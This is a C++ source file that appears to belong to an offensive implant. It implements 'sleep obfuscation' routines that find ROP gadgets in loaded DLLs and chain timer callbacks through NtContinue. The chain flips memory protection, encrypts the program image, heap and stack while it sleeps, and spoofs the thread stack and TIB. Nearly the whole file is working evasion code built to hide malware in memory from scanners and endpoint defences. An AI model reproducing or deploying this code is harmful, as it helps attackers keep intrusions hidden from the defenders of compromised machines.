#include "SleepObfuscation.hpp"
#include "Instance.hpp"
#include "Syscalls.hpp"
#include "Win32.hpp"
#include "StringCrypt.hpp"
#include "StackHeapCrypt.hpp"
#include "PatcherAndHooker.hpp"
#include "SecureWideString.hpp"
#include "SecureException.hpp"
#include "Crypt.hpp"
#include <stddef.h>
#include <stdlib.h>
#include <time.h>

void SleepObfuscation::DoStackHeapEncryptDecrypt(bool encrypt) {
	if (encrypt) {
		PatcherAndHooker::DoPatches(true);
		if (Instance::HeapEncrypt) {
			// Debug
			printf("Encrypting... Allocations: %d\n", StackHeapCrypt::HeapAllocationsIndex);
			//printf("HeapAllocation structure size: %d\n", sizeof(HeapAllocation));
			PatcherAndHooker::HookHeapFunctions(true);
			StackHeapCrypt::EncryptDecryptStacksAndHeaps(true);
		}
	}
	else {
		if (Instance::HeapEncrypt) {
			StackHeapCrypt::EncryptDecryptStacksAndHeaps(false);
			PatcherAndHooker::HookHeapFunctions(false);
		}
		PatcherAndHooker::DoPatches(false);
	}
}

void SleepObfuscation::GenerateRandomKey(CHAR array[], size_t length) {
	// Seed the random number generator
	srand((unsigned int)time(NULL));

	for (size_t i = 0; i < length; i++) {
		// Generate a random character and assign it to the array
		// This generates a random ASCII character from 0 to 255.
		// You can adjust the range if needed.
		array[i] = (CHAR)(rand() % 256);
	}
}

PVOID SleepObfuscation::FindGadget(PBYTE sequence) {	
    PUNICODE_STRING pDllName = NULL;
    PVOID pDllBase = NULL;
    PPEB_LDR_DATA pLdrData = NULL;
    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL, pModuleStart = NULL;
    PPEB pCurrentPeb = SystemCalls::Peb;
    pLdrData = pCurrentPeb->Ldr;
    pModuleEntry = pModuleStart = (PLDR_DATA_TABLE_ENTRY)pLdrData->InLoadOrderModuleList.Flink;
    // Skip the current module and start from the second flink
    pModuleEntry = (PLDR_DATA_TABLE_ENTRY)pModuleEntry->InLoadOrderLinks.Flink;

    try {
		SIZE_T sequenceLength = strlen((char*)sequence);

        do {
            pDllName = &pModuleEntry->BaseDllName;
            if (pDllName->Buffer == NULL) {
                //printf("[*] got null...\n");
                break;
            }

            pDllBase = (PVOID)pModuleEntry->DllBase;

            PIMAGE_DOS_HEADER pInMemImageDosHeader = (PIMAGE_DOS_HEADER)pDllBase;

            if (pInMemImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
                throw SecureException(StringCrypt::DecryptString(StringCrypt::INVALIDDOSSIGNATURE_CRYPT));
            }

            PIMAGE_NT_HEADERS pInMemImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pDllBase + pInMemImageDosHeader->e_lfanew);
            if (pInMemImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
                throw SecureException(StringCrypt::DecryptString(StringCrypt::INVALIDNTSIGNATURE_CRYPT));
            }

            // Pointer to the first section header
            PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pInMemImageNtHeaders);

            // Iterate through the sections
            for (WORD i = 0; i < pInMemImageNtHeaders->FileHeader.NumberOfSections; ++i) {
                PIMAGE_SECTION_HEADER SecHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pInMemImageNtHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
                if (!_stricmp((char*)SecHeader->Name, (char*)StringCrypt::DecryptString(StringCrypt::TEXT_CRYPT).c_str()))
                {
                    PBYTE sectionStart = (PBYTE)((DWORD_PTR)pDllBase + SecHeader->VirtualAddress);
                    SIZE_T sectionSize = SecHeader->Misc.VirtualSize;

                    for (SIZE_T j = 0; j < sectionSize - sequenceLength; ++j) {
                        if (Instance::memcmp(sectionStart + j, sequence, sequenceLength) == 0) {
                            return (PVOID)(sectionStart + j);
                        }
                    }
                }
            }
            pModuleEntry = (PLDR_DATA_TABLE_ENTRY)pModuleEntry->InLoadOrderLinks.Flink;
        } while (pModuleEntry != pModuleStart);

        return NULL;
    }
    catch (const SecureException& e) {
        throw;
    }
    catch (...) {
        throw;
    }
}

/*
 * Named after the infamous Thanos snap of the infinity gauntlet that wiped out half of the universe
 * This technique spoofs the stack by overwriting the return address of the assembly function with zero
 * Based on: https://github.com/mgeeky/ThreadStackSpoofer
*/
void SleepObfuscation::SnapSiestaZeroTrace() {
	PVOID rcxGadget;
	PVOID rdxGadget;
	PVOID r8Gadget;
	PVOID shadowFixerGadget;

	HANDLE hProtectionRWTimer;
	HANDLE hProtectionRWXTimer;
	HANDLE hEncryptionTimer;
	HANDLE hDecryptionTimer;
	HANDLE hDummyThreadTimer;

	LARGE_INTEGER protectionRWDueTime;
	LARGE_INTEGER protectionRWXDueTime;
	LARGE_INTEGER encryptionDueTime;
	LARGE_INTEGER decryptionDueTime;
	LARGE_INTEGER dummyDueTime;

	CONTEXT ctxDummyThread = { 0 };
	CONTEXT ctxProtectionRW = { 0 };
	CONTEXT ctxProtectionRWX = { 0 };
	CONTEXT ctxEncryption = { 0 };
	CONTEXT ctxDecryption = { 0 };

	PVOID ImageBase = NULL;
	DWORD ImageSize = 0;
	DWORD oldProtect = 0;
	CRYPT_BUFFER Image = { 0 };
	DATA_KEY Key = { 0 };
	CHAR keyBuffer[16];

	try {
		// Generating the random key
		GenerateRandomKey(keyBuffer, 16);

		// Getting the image base.
		PPEB_LDR_DATA LdrData = NULL;
		PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
		LdrData = SystemCalls::Peb->Ldr;

		// Getting the image base, first flink is this module		
		pModuleEntry = (PLDR_DATA_TABLE_ENTRY)LdrData->InLoadOrderModuleList.Flink;
		ImageBase = (PVOID)pModuleEntry->DllBase;

		PIMAGE_DOS_HEADER pInMemImageDosHeader = (PIMAGE_DOS_HEADER)ImageBase;

		if (pInMemImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
			throw SecureException(StringCrypt::DecryptString(StringCrypt::INVALIDDOSSIGNATURE_CRYPT));
		}

		PIMAGE_NT_HEADERS pInMemImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + pInMemImageDosHeader->e_lfanew);
		if (pInMemImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
			throw SecureException(StringCrypt::DecryptString(StringCrypt::INVALIDNTSIGNATURE_CRYPT));
		}

		ImageSize = pInMemImageNtHeaders->OptionalHeader.SizeOfImage;

		IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(pInMemImageNtHeaders);

		LPVOID txtSectionBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)sectionHeader->PointerToRawData);
		DWORD txtSectionSize = sectionHeader->SizeOfRawData;

		LPVOID relocBase = NULL;
		DWORD relocSize = 0;
		//printf("[+] %s\t%p\t%d bytes\n", sectionHeader->Name, txtSectionBase, txtSectionSize);

		for (int i = 0; i < pInMemImageNtHeaders->FileHeader.NumberOfSections; i++) {
			//printf("[+] %s\t%p\t%d bytes\n", sectionHeader->Name, (LPVOID)((DWORD64)ImageBase + (DWORD64)sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData);

			if (!strcmp(StringCrypt::DecryptString(StringCrypt::RELOC_CRYPT).c_str(), (const char*)sectionHeader->Name)) {
				relocBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)sectionHeader->PointerToRawData);
				relocSize = sectionHeader->SizeOfRawData;
			}
			sectionHeader++;
		}

		DWORD CryptSize = (DWORD)((DWORD_PTR)relocBase - (DWORD_PTR)txtSectionBase);

		// Initializing the image and key for SystemFunction032
		Key.Buffer = keyBuffer;
		Key.Length = Key.MaximumLength = 16;

		Image.Buffer = txtSectionBase;
		Image.Length = Image.MaximumLength = CryptSize;

		hDummyThreadTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hProtectionRWTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hEncryptionTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hDecryptionTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hProtectionRWXTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());

		if (hDummyThreadTimer == NULL || hProtectionRWTimer == NULL || hEncryptionTimer == NULL || hDecryptionTimer == NULL || hProtectionRWXTimer == NULL) {
			throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::CREATINGTIMERS_CRYPT)));
		}

		InitializeTimerMs(&dummyDueTime, 0);

		Instance::SetTimerNative(hDummyThreadTimer, dummyDueTime, (PTIMER_APC_ROUTINE)RtlCaptureContext, &ctxDummyThread);

		LARGE_INTEGER liTimeout;
		liTimeout.QuadPart = -10000LL * INFINITE; // A negative value indicates a relative time	

		// Wait indefinitely in an alertable state
		SyscallPrepare(SystemCalls::SysTable.SysNtWaitForSingleObject.wSyscallNr, SystemCalls::SysTable.SysNtWaitForSingleObject.pRecycled);
		Instance::NtStatus = SysNtWaitForSingleObject(hDummyThreadTimer, TRUE, &liTimeout);

		// Creating the contexts.
		Instance::memcpy(&ctxProtectionRW, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxEncryption, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxDecryption, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxProtectionRWX, &ctxDummyThread, sizeof(CONTEXT));

		InitializeTimerMs(&protectionRWDueTime, 0);
		InitializeTimerMs(&encryptionDueTime, 1);
		InitializeTimerMs(&decryptionDueTime, Instance::SleepWithJitter - 1);
		InitializeTimerMs(&protectionRWXDueTime, Instance::SleepWithJitter);

		/*
		* These were the results of TestPentaNtWaitAndDelay CONTEXT captures from the assembly function after each interval:
		* ctxTest.Rsp: 0000008BB572DC70
		* ctxTest2.Rsp: 0000008BB572DA70 (512)
		* ctxTest3.Rsp: 0000008BB572DB50 (-224)
		* ctxTest4.Rsp: 0000008BB572DBC0 (-112)
		* ctxTest5.Rsp: 0000008BB572DC20 (-96)
		*/
		ctxProtectionRW.Rsp -= (DWORD64)(8 + 512);
		ctxProtectionRW.Rip = (DWORD_PTR)Win32::Kernel32Table.pVirtualProtect.pAddress;
		ctxProtectionRW.Rcx = (DWORD_PTR)ImageBase;
		ctxProtectionRW.Rdx = ImageSize;
		ctxProtectionRW.R8 = PAGE_READWRITE;
		ctxProtectionRW.R9 = (DWORD_PTR)&oldProtect;

		// Subtract 224 from 512
		ctxEncryption.Rsp -= (DWORD64)(8 + 288);
		ctxEncryption.Rip = (DWORD_PTR)Win32::CryptSpTable.pSystemFunction032.pAddress;
		ctxEncryption.Rcx = (DWORD_PTR)&Image;
		ctxEncryption.Rdx = (DWORD_PTR)&Key;

		// Subtract 112 from 288
		ctxDecryption.Rsp -= (DWORD64)(8 + 176);
		ctxDecryption.Rip = (DWORD_PTR)Win32::CryptSpTable.pSystemFunction032.pAddress;
		ctxDecryption.Rcx = (DWORD_PTR)&Image;
		ctxDecryption.Rdx = (DWORD_PTR)&Key;

		// Subtract 96 from 176
		ctxProtectionRWX.Rsp -= (DWORD64)(8 + 80);
		ctxProtectionRWX.Rip = (DWORD_PTR)Win32::Kernel32Table.pVirtualProtect.pAddress;
		ctxProtectionRWX.Rcx = (DWORD_PTR)ImageBase;
		ctxProtectionRWX.Rdx = ImageSize;
		ctxProtectionRWX.R8 = PAGE_EXECUTE_READWRITE;
		ctxProtectionRWX.R9 = (DWORD_PTR)&oldProtect;

		Instance::SetTimerNative(hProtectionRWTimer, protectionRWDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxProtectionRW);
		Instance::SetTimerNative(hEncryptionTimer, encryptionDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxEncryption);
		Instance::SetTimerNative(hDecryptionTimer, decryptionDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxDecryption);
		Instance::SetTimerNative(hProtectionRWXTimer, protectionRWXDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxProtectionRWX);

		// Gadget: pop rcx; ret;
		// This gadget pops the top value of the stack into the rcx register and then returns
		// 'pop rcx' is represented by the opcode 0x59, and 'ret' is represented by 0xC3.
		rcxGadget = FindGadget((PBYTE)"\x59\xC3");

		// Gadget: pop rdx; ret;
		// This gadget pops the top value of the stack into the rdx register and then returns.
		// 'pop rdx' is represented by the opcode 0x5A, and 'ret' is represented by 0xC3.
		rdxGadget = FindGadget((PBYTE)"\x5A\xC3");

		// Gadget: add rsp, 20h; pop rdi; ret;
		// This gadget increases the stack pointer by 32 (0x20) bytes (adjusting the stack),
		// pops the next value into rdi, and then returns.
		// 'add rsp, 20h' is represented by the opcodes 0x48 0x83 0xC4 0x20,
		// 'pop rdi' is represented by 0x5F, and 'ret' by 0xC3.
		shadowFixerGadget = FindGadget((PBYTE)"\x48\x83\xC4\x20\x5F\xC3");

		// Gadget: pop r8; ret;
		// This gadget pops the top value of the stack into the r8 register and then returns.
		// 'pop r8' is represented by the opcodes 0x41 0x58, and 'ret' is represented by 0xC3.
		r8Gadget = FindGadget((PBYTE)"\x41\x58\xC3");

		if (rcxGadget == 0 || rdxGadget == 0 || r8Gadget == 0 || shadowFixerGadget == 0) {
			throw SecureException(StringCrypt::DecryptString(StringCrypt::FAILEDTOFINDGADGETS_CRYPT));
		}

		DoStackHeapEncryptDecrypt(true);
		PentaNtWaitAndDelayZeroTrace(rcxGadget, rdxGadget, shadowFixerGadget, r8Gadget, &liTimeout, Win32::NtdllTable.pNtWaitForSingleObject.pAddress, Win32::NtdllTable.pNtDelayExecution.pAddress, hProtectionRWTimer, hEncryptionTimer, hDecryptionTimer, hProtectionRWXTimer);
		DoStackHeapEncryptDecrypt(false);
	}
	catch (const SecureException& e) {
		throw;
	}
	catch (...) {
		throw;
	}
}

/*
* Named after the infamous Thanos snap of the infinity gauntlet that wiped out half of the universe
* This technique spoofs the stack by copying the NT_TIB structure of the main thread at a previous (clean) state,
* and then overwriting the current NT_TIB with the copied one. Specific compiler flags are needed to make this work:
* Disable GS (/GS-)
* Disable Code Optimisation (/Od)
* Disable Whole Program Optimisation (Remove /GL)
* Disable size and speed preference (Remove /Os, /Ot)
* Enable intrinsic if not enabled (/Oi)
*/
void SleepObfuscation::SnapSiestaTibCopy() {
	PVOID rcxGadget;
	PVOID rdxGadget;
	PVOID r8Gadget;
	PVOID shadowFixerGadget;

	HANDLE hDummyThreadTimer;
	HANDLE hProtectionRWTimer;
	HANDLE hRtlCopyBackupTimer;
	HANDLE hRtlCopySpoofTimer;
	HANDLE hRtlCopyRestoreTimer;
	HANDLE hEncryptionTimer;
	HANDLE hDecryptionTimer;
	HANDLE hProtectionRWXTimer;

	LARGE_INTEGER dummyDueTime;
	LARGE_INTEGER protectionRWDueTime;
	LARGE_INTEGER encryptionDueTime;
	LARGE_INTEGER rtlCopyBackupDueTime;
	LARGE_INTEGER rtlCopySpoofDueTime;
	LARGE_INTEGER rtlCopyRestoreDueTime;
	LARGE_INTEGER decryptionDueTime;
	LARGE_INTEGER protectionRWXDueTime;

	CONTEXT ctxDummyThread = { 0 };
	CONTEXT ctxProtectionRW = { 0 };
	CONTEXT ctxRtlCopyBackup = { 0 };
	CONTEXT ctxRtlCopySpoof = { 0 };
	CONTEXT ctxRtlCopyRestore = { 0 };
	CONTEXT ctxEncryption = { 0 };
	CONTEXT ctxDecryption = { 0 };
	CONTEXT ctxProtectionRWX = { 0 };

	PVOID ImageBase = NULL;
	DWORD ImageSize = 0;
	DWORD oldProtect = 0;
	CRYPT_BUFFER Image = { 0 };
	DATA_KEY Key = { 0 };
	CHAR keyBuffer[16];

	try {
		// Generating the random key
		GenerateRandomKey(keyBuffer, 16);

		// Getting the image base.
		PPEB_LDR_DATA LdrData = NULL;
		PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
		LdrData = SystemCalls::Peb->Ldr;

		// Getting the image base, first flink is this module		
		pModuleEntry = (PLDR_DATA_TABLE_ENTRY)LdrData->InLoadOrderModuleList.Flink;
		ImageBase = (PVOID)pModuleEntry->DllBase;

		PIMAGE_DOS_HEADER pInMemImageDosHeader = (PIMAGE_DOS_HEADER)ImageBase;

		if (pInMemImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
			throw SecureException(StringCrypt::DecryptString(StringCrypt::INVALIDDOSSIGNATURE_CRYPT));
		}

		PIMAGE_NT_HEADERS pInMemImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + pInMemImageDosHeader->e_lfanew);
		if (pInMemImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
			throw SecureException(StringCrypt::DecryptString(StringCrypt::INVALIDNTSIGNATURE_CRYPT));
		}

		ImageSize = pInMemImageNtHeaders->OptionalHeader.SizeOfImage;

		IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(pInMemImageNtHeaders);

		LPVOID txtSectionBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)sectionHeader->PointerToRawData);
		DWORD txtSectionSize = sectionHeader->SizeOfRawData;

		LPVOID relocBase = NULL;
		DWORD relocSize = 0;
		//printf("[+] %s\t%p\t%d bytes\n", sectionHeader->Name, txtSectionBase, txtSectionSize);

		for (int i = 0; i < pInMemImageNtHeaders->FileHeader.NumberOfSections; i++) {
			//printf("[+] %s\t%p\t%d bytes\n", sectionHeader->Name, (LPVOID)((DWORD64)ImageBase + (DWORD64)sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData);

			if (!strcmp(StringCrypt::DecryptString(StringCrypt::RELOC_CRYPT).c_str(), (const char*)sectionHeader->Name)) {
				relocBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)sectionHeader->PointerToRawData);
				relocSize = sectionHeader->SizeOfRawData;
			}
			sectionHeader++;
		}

		DWORD CryptSize = (DWORD)((DWORD_PTR)relocBase - (DWORD_PTR)txtSectionBase);

		// Initializing the image and key for SystemFunction032
		Key.Buffer = keyBuffer;
		Key.Length = Key.MaximumLength = 16;

		Image.Buffer = txtSectionBase;
		Image.Length = Image.MaximumLength = CryptSize;

		hDummyThreadTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hProtectionRWTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hRtlCopyBackupTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hRtlCopySpoofTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hRtlCopyRestoreTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hEncryptionTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hDecryptionTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());
		hProtectionRWXTimer = Instance::CreateTimerNative(SecureWideString(Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(1, 255)).c_str()).c_str());

		if (hDummyThreadTimer == NULL || hProtectionRWTimer == NULL || hRtlCopyBackupTimer == NULL || hRtlCopySpoofTimer == NULL || hRtlCopyRestoreTimer == NULL || hEncryptionTimer == NULL || hDecryptionTimer == NULL || hProtectionRWXTimer == NULL) {
			throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::CREATINGTIMERS_CRYPT)));
		}

		InitializeTimerMs(&dummyDueTime, 0);

		Instance::SetTimerNative(hDummyThreadTimer, dummyDueTime, (PTIMER_APC_ROUTINE)RtlCaptureContext, &ctxDummyThread);

		LARGE_INTEGER liTimeout;
		liTimeout.QuadPart = -10000LL * INFINITE; // A negative value indicates a relative time	

		// Wait indefinitely in an alertable state
		SyscallPrepare(SystemCalls::SysTable.SysNtWaitForSingleObject.wSyscallNr, SystemCalls::SysTable.SysNtWaitForSingleObject.pRecycled);
		Instance::NtStatus = SysNtWaitForSingleObject(hDummyThreadTimer, TRUE, &liTimeout);

		// Copy the current (clean) TIB
		NT_TIB* tib = Instance::GetTib();
		NT_TIB* tibSpoof = new NT_TIB;
		Instance::memcpy(tibSpoof, tib, sizeof(NT_TIB));

		// Keep a copy of the TIB during the ROP chain
		NT_TIB* tibCopy = new NT_TIB;

		// Creating the contexts.
		Instance::memcpy(&ctxProtectionRW, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxRtlCopyBackup, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxRtlCopySpoof, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxRtlCopyRestore, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxEncryption, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxDecryption, &ctxDummyThread, sizeof(CONTEXT));
		Instance::memcpy(&ctxProtectionRWX, &ctxDummyThread, sizeof(CONTEXT));

		InitializeTimerMs(&protectionRWDueTime, 0);
		InitializeTimerMs(&encryptionDueTime, 1);
		InitializeTimerMs(&rtlCopyBackupDueTime, 1.25);
		InitializeTimerMs(&rtlCopySpoofDueTime, 1.5);
		InitializeTimerMs(&rtlCopyRestoreDueTime, Instance::SleepWithJitter - 1.5);
		InitializeTimerMs(&decryptionDueTime, Instance::SleepWithJitter - 1);
		InitializeTimerMs(&protectionRWXDueTime, Instance::SleepWithJitter);

		/*
		* These were the results of TestSeptaNtWaitAndDelay CONTEXT captures from the assembly function after each interval:
		* ctxTest.Rsp: 000000BABEB5CCB0
		* ctxTest2.Rsp: 000000BABEB5C960 (848)
		* ctxTest3.Rsp: 000000BABEB5CA40 (-224)
		* ctxTest4.Rsp: 000000BABEB5CAB0 (-112)
		* ctxTest5.Rsp: 000000BABEB5CB20 (-112)
		* ctxTest6.Rsp: 000000BABEB5CB90 (-112)
		* ctxTest7.Rsp: 000000BABEB5CC00 (-112)
		* ctxTest8.Rsp: 000000BABEB5CC60 (-96)
		*/
		ctxProtectionRW.Rsp -= (DWORD64)(8 + 848);
		ctxProtectionRW.Rip = (DWORD_PTR)Win32::Kernel32Table.pVirtualProtect.pAddress;
		ctxProtectionRW.Rcx = (DWORD_PTR)ImageBase;
		ctxProtectionRW.Rdx = ImageSize;
		ctxProtectionRW.R8 = PAGE_READWRITE;
		ctxProtectionRW.R9 = (DWORD_PTR)&oldProtect;

		// Subtract 224 from 848
		ctxEncryption.Rsp -= (DWORD64)(8 + 624);
		ctxEncryption.Rip = (DWORD_PTR)Win32::CryptSpTable.pSystemFunction032.pAddress;
		ctxEncryption.Rcx = (DWORD_PTR)&Image;
		ctxEncryption.Rdx = (DWORD_PTR)&Key;

		// Subtract 112 from 624
		ctxRtlCopyBackup.Rsp -= (DWORD64)(8 + 512);
		ctxRtlCopyBackup.Rip = (DWORD_PTR)Win32::NtdllTable.pRtlCopyMemory.pAddress;
		ctxRtlCopyBackup.Rcx = (DWORD_PTR)tibCopy;
		ctxRtlCopyBackup.Rdx = (DWORD_PTR)tib;
		ctxRtlCopyBackup.R8 = (DWORD64)sizeof(NT_TIB);

		// Subtract 112 from 512
		ctxRtlCopySpoof.Rsp -= (DWORD64)(8 + 400);
		ctxRtlCopySpoof.Rip = (DWORD_PTR)Win32::NtdllTable.pRtlCopyMemory.pAddress;
		ctxRtlCopySpoof.Rcx = (DWORD_PTR)tib;
		ctxRtlCopySpoof.Rdx = (DWORD_PTR)tibSpoof;
		ctxRtlCopySpoof.R8 = (DWORD64)sizeof(NT_TIB);

		// Subtract 112 from 400
		ctxRtlCopyRestore.Rsp -= (DWORD64)(8 + 288);
		ctxRtlCopyRestore.Rip = (DWORD_PTR)Win32::NtdllTable.pRtlCopyMemory.pAddress;
		ctxRtlCopyRestore.Rcx = (DWORD_PTR)tib;
		ctxRtlCopyRestore.Rdx = (DWORD_PTR)tibCopy;
		ctxRtlCopyRestore.R8 = (DWORD64)sizeof(NT_TIB);

		// Subtract 112 from 288
		ctxDecryption.Rsp -= (DWORD64)(8 + 176);
		ctxDecryption.Rip = (DWORD_PTR)Win32::CryptSpTable.pSystemFunction032.pAddress;
		ctxDecryption.Rcx = (DWORD_PTR)&Image;
		ctxDecryption.Rdx = (DWORD_PTR)&Key;

		// Subtract 96 from 176
		ctxProtectionRWX.Rsp -= (DWORD64)(8 + 80);
		ctxProtectionRWX.Rip = (DWORD_PTR)Win32::Kernel32Table.pVirtualProtect.pAddress;
		ctxProtectionRWX.Rcx = (DWORD_PTR)ImageBase;
		ctxProtectionRWX.Rdx = ImageSize;
		ctxProtectionRWX.R8 = PAGE_EXECUTE_READWRITE;
		ctxProtectionRWX.R9 = (DWORD_PTR)&oldProtect;

		Instance::SetTimerNative(hProtectionRWTimer, protectionRWDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxProtectionRW);
		Instance::SetTimerNative(hEncryptionTimer, encryptionDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxEncryption);
		Instance::SetTimerNative(hRtlCopyBackupTimer, rtlCopyBackupDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxRtlCopyBackup);
		Instance::SetTimerNative(hRtlCopySpoofTimer, rtlCopySpoofDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxRtlCopySpoof);
		Instance::SetTimerNative(hRtlCopyRestoreTimer, rtlCopyRestoreDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxRtlCopyRestore);
		Instance::SetTimerNative(hDecryptionTimer, decryptionDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxDecryption);
		Instance::SetTimerNative(hProtectionRWXTimer, protectionRWXDueTime, (PTIMER_APC_ROUTINE)Win32::NtdllTable.pNtContinue.pAddress, &ctxProtectionRWX);

		// Gadget: pop rcx; ret;
		// This gadget pops the top value of the stack into the rcx register and then returns
		// 'pop rcx' is represented by the opcode 0x59, and 'ret' is represented by 0xC3.
		rcxGadget = FindGadget((PBYTE)"\x59\xC3");

		// Gadget: pop rdx; ret;
		// This gadget pops the top value of the stack into the rdx register and then returns.
		// 'pop rdx' is represented by the opcode 0x5A, and 'ret' is represented by 0xC3.
		rdxGadget = FindGadget((PBYTE)"\x5A\xC3");

		// Gadget: add rsp, 20h; pop rdi; ret;
		// This gadget increases the stack pointer by 32 (0x20) bytes (adjusting the stack),
		// pops the next value into rdi, and then returns.
		// 'add rsp, 20h' is represented by the opcodes 0x48 0x83 0xC4 0x20,
		// 'pop rdi' is represented by 0x5F, and 'ret' by 0xC3.
		shadowFixerGadget = FindGadget((PBYTE)"\x48\x83\xC4\x20\x5F\xC3");

		// Gadget: pop r8; ret;
		// This gadget pops the top value of the stack into the r8 register and then returns.
		// 'pop r8' is represented by the opcodes 0x41 0x58, and 'ret' is represented by 0xC3.
		r8Gadget = FindGadget((PBYTE)"\x41\x58\xC3");

		if (rcxGadget == 0 || rdxGadget == 0 || r8Gadget == 0 || shadowFixerGadget == 0) {
			throw SecureException(StringCrypt::DecryptString(StringCrypt::FAILEDTOFINDGADGETS_CRYPT));
		}
		
		DoStackHeapEncryptDecrypt(true);
		SeptaNtWaitAndDelay(rcxGadget, rdxGadget, shadowFixerGadget, r8Gadget, &liTimeout, Win32::NtdllTable.pNtWaitForSingleObject.pAddress, Win32::NtdllTable.pNtDelayExecution.pAddress, hProtectionRWTimer, hEncryptionTimer, hRtlCopyBackupTimer, hRtlCopySpoofTimer, hRtlCopyRestoreTimer, hDecryptionTimer, hProtectionRWXTimer);
		//Sleep(10000);
		DoStackHeapEncryptDecrypt(false);
	}
	catch (const SecureException& e) {
		throw;
	}
	catch (...) {
		throw;
	}
}
